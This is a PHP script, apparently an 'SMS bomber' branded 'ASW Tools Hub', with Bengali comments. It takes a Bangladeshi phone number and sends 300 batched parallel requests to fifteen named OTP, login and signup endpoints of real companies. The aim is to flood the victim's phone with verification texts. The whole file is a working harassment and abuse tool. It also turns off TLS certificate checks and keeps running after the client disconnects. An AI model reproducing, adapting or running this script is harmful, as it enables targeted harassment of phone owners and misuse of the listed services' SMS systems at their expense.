<?php
header('Content-Type: application/json');
set_time_limit(0); 
ignore_user_abort(true);

$phone = $_GET['phone'] ?? '';
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;

// তোর সব এপিআই এখানে
$base_apis = [
    ["url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login","method"=>"POST","data"=>["username"=>$phone_11]],
    ["url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88","method"=>"POST"],
    ["url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","method"=>"POST","data"=>["userPhone"=>$phone_11]],
    ["url"=>"https://connect.shadhinmusic.com/v1/api//otp/send","method"=>"POST","data"=>["msisdn"=>$phone_88]],
    ["url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method"=>"POST","data"=>["phoneNumber"=>$phone_11]],
    ["url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"],
    ["url"=>"https://api.chardike.com/api/otp/send","method"=>"POST","data"=>["phone"=>$phone_11,"otp_type"=>"login"]],
    ["url"=>"https://bb-api.bohubrihi.com/public/activity/otp","method"=>"POST","data"=>["phone"=>$phone_11,"intent"=>"login"]],
    ["url"=>"https://api.ghoorilearning.com/api/auth/signup/otp","method"=>"POST","data"=>["mobile_no"=>$phone_11]],
    ["url"=>"https://apix.rabbitholebd.com/appv2/login/requestOTP","method"=>"POST","data"=>["mobile"=>"+88".$phone_11]],
    ["url"=>"https://www.rokomari.com/otp/send?emailOrPhone=".$phone_88."&countryCode=BD","method"=>"GET"],
    ["url"=>"https://api.bd.airtel.com/v1/account/login/otp","method"=>"POST","data"=>["phone_number"=>$phone_11]],
    ["url"=>"https://app.eonbazar.com/api/auth/register","method"=>"POST","data"=>["mobile"=>$phone_11]],
    ["url"=>"https://api.ostad.app/api/v2/user/with-otp","method"=>"POST","data"=>["msisdn"=>$phone_11]],
    ["url"=>"https://prod-api.viewlift.com/identity/signup?site=prothomalo","method"=>"POST","data"=>["requestType"=>"send","phoneNumber"=>$phone_plus88]]
];

$total_requests = 300;
$batch_size = 30; // একবারে ৩০টা করে রিকোয়েস্ট যাবে
$master_results = [];

for ($j = 0; $j < ($total_requests / $batch_size); $j++) {
    $mh = curl_multi_init();
    $handles = [];

    for ($i = 0; $i < $batch_size; $i++) {
        $api = $base_apis[($j * $batch_size + $i) % count($base_apis)];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api['url']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        
        if (isset($api['method']) && $api['method'] === "POST") {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type:application/json', 'User-Agent: Mozilla/5.0']);
        }
        
        curl_multi_add_handle($mh, $ch);
        $handles[] = $ch;
    }

    // প্যারালাল এক্সিকিউশন শুরু
    $running = null;
    do {
        curl_multi_exec($mh, $running);
    } while ($running > 0);

    foreach ($handles as $ch) {
        $master_results[] = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);
    
    usleep(500000); // প্রতি ব্যাচের পর ০.৫ সেকেন্ড গ্যাপ (সার্ভার সেফটি)
}

echo json_encode([
    "status" => "success",
    "total_hits" => count($master_results),
    "message" => "ASW Tools Hub: 300 Requests Completed"
], JSON_PRETTY_PRINT);
